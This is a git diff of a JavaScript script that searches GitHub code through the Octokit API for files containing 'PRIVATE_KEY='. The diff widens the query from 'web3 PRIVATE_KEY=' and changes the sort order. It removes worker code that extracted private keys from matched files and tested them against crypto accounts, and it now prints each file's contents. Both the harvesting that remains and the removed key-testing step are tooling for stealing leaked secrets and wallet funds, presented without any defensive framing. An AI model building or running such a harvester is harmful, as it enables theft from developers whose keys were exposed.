@@ -334,8 +334,8 @@ const collectFiles = async (query, ghAccount, page) => {
   
   const code = await makeOctokitRequest(ghAccount.rest.search.code({
     q: query,
-    order: 'asc',
-    sort: 'indexed',
+    order: 'desc',
+    sort: 'best-match',
     per_page: 100,
     page
   }), ghAccount).catch(err => err)
@@ -491,24 +491,14 @@ const start =  async () => {
   })
 }
 
- const filePromiseChain = () => {
   
-}  
- const query = 'web3 PRIVATE_KEY='
+ const query = 'PRIVATE_KEY='
  initGithubAccounts().then(accounts => {
 
    const ghAccount = accounts[0].ghAccount
    collectFiles(query, ghAccount, 1).then(res => {
-    return Promise.each(res, async file => {
-     const parser = await spawn(new Worker("./workers/parseFile"))
-     const result = await parser(file.content)
-     const privateKeys = result.privateKeys
-     console.log("got private keys", privateKeys)
-     if(privateKeys.length > 0) {
-        const privateKeyTester = await spawn(new Worker("./workers/testPrivateKeys.js"))
-        const cryptoAccounts = await privateKeyTester(privateKeys)
-        console.log("cryptoaccounts", cryptoAccounts)
-    }
+    return Promise.each(res, file => {
+     console.log(file.content)
    })
   })
  })
